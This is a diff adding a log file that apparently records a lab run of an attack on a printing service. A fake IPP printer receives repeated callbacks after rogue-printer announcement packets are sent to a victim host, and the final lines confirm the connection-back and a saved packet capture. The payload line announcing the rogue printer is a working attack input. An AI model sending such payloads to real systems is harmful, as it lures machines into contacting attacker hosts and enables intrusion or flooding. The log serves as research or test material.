@@ -1,0 +1,65 @@
+2026-10-28 12:02:47,697 INFO fake IPP printer listening on tcp/8631
+2026-10-28 12:02:48,699 INFO sending 20 packet(s) to 172.20.0.10:631 payload=b'0 3 ipp://172.20.0.1:8631/printers/FloodPrinter "Lab" "Rogue Printer"\n'
+2026-10-28 12:02:48,734 WARNING CALLBACK: victim 172.20.0.10:41930 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:48,738 WARNING CALLBACK: victim 172.20.0.10:41936 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:48,741 WARNING CALLBACK: victim 172.20.0.10:41946 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:48,848 WARNING CALLBACK: victim 172.20.0.10:41962 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:48,851 WARNING CALLBACK: victim 172.20.0.10:41978 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:48,852 WARNING CALLBACK: victim 172.20.0.10:41980 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:48,950 WARNING CALLBACK: victim 172.20.0.10:41982 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:48,953 WARNING CALLBACK: victim 172.20.0.10:41992 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:48,955 WARNING CALLBACK: victim 172.20.0.10:41996 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:49,065 WARNING CALLBACK: victim 172.20.0.10:42002 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:49,069 WARNING CALLBACK: victim 172.20.0.10:42016 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:49,071 WARNING CALLBACK: victim 172.20.0.10:42024 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:49,174 WARNING CALLBACK: victim 172.20.0.10:42032 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:49,178 WARNING CALLBACK: victim 172.20.0.10:42048 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:49,181 WARNING CALLBACK: victim 172.20.0.10:42050 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:49,277 WARNING CALLBACK: victim 172.20.0.10:42064 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:49,280 WARNING CALLBACK: victim 172.20.0.10:42076 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:49,281 WARNING CALLBACK: victim 172.20.0.10:42078 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:49,375 WARNING CALLBACK: victim 172.20.0.10:42082 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:49,377 WARNING CALLBACK: victim 172.20.0.10:42094 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:49,379 WARNING CALLBACK: victim 172.20.0.10:42102 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:49,483 WARNING CALLBACK: victim 172.20.0.10:42116 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:49,488 WARNING CALLBACK: victim 172.20.0.10:42128 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:49,491 WARNING CALLBACK: victim 172.20.0.10:42138 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:49,584 WARNING CALLBACK: victim 172.20.0.10:42140 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:49,594 WARNING CALLBACK: victim 172.20.0.10:42150 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:49,596 WARNING CALLBACK: victim 172.20.0.10:42166 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:49,686 WARNING CALLBACK: victim 172.20.0.10:42168 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:49,692 WARNING CALLBACK: victim 172.20.0.10:42172 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:49,693 WARNING CALLBACK: victim 172.20.0.10:42184 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:49,802 WARNING CALLBACK: victim 172.20.0.10:42186 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:49,806 WARNING CALLBACK: victim 172.20.0.10:42202 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:49,809 WARNING CALLBACK: victim 172.20.0.10:42218 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:49,902 WARNING CALLBACK: victim 172.20.0.10:42228 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:49,905 WARNING CALLBACK: victim 172.20.0.10:42244 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:49,907 WARNING CALLBACK: victim 172.20.0.10:42254 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:50,008 WARNING CALLBACK: victim 172.20.0.10:42262 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:50,015 WARNING CALLBACK: victim 172.20.0.10:42272 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:50,016 WARNING CALLBACK: victim 172.20.0.10:42278 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:50,132 WARNING CALLBACK: victim 172.20.0.10:42294 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:50,135 WARNING CALLBACK: victim 172.20.0.10:42302 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:50,138 WARNING CALLBACK: victim 172.20.0.10:42308 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:50,236 WARNING CALLBACK: victim 172.20.0.10:42322 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:50,240 WARNING CALLBACK: victim 172.20.0.10:42328 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:50,242 WARNING CALLBACK: victim 172.20.0.10:42338 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:50,344 WARNING CALLBACK: victim 172.20.0.10:42340 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:50,353 WARNING CALLBACK: victim 172.20.0.10:42354 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:50,355 WARNING CALLBACK: victim 172.20.0.10:42358 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:50,442 WARNING CALLBACK: victim 172.20.0.10:42370 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:50,450 WARNING CALLBACK: victim 172.20.0.10:42378 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:50,453 WARNING CALLBACK: victim 172.20.0.10:42386 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:50,541 WARNING CALLBACK: victim 172.20.0.10:42400 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:50,546 WARNING CALLBACK: victim 172.20.0.10:42406 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:50,549 WARNING CALLBACK: victim 172.20.0.10:42422 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:50,651 WARNING CALLBACK: victim 172.20.0.10:42434 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:50,654 WARNING CALLBACK: victim 172.20.0.10:42450 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:50,659 WARNING CALLBACK: victim 172.20.0.10:42460 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:50,761 WARNING CALLBACK: victim 172.20.0.10:42468 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:50,765 WARNING CALLBACK: victim 172.20.0.10:42480 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:50,769 WARNING CALLBACK: victim 172.20.0.10:42496 -> fake printer | POST /printers/FloodPrinter HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:02:50,875 INFO watching 10 s for the victim to connect back ...
+2026-10-28 12:03:01,052 WARNING RESULT: victim 172.20.0.10 opened TCP connection to 172.20.0.1:8631
+2026-10-28 12:03:01,107 INFO saved 742 packets to pcap_files/06_var3_flood.pcap
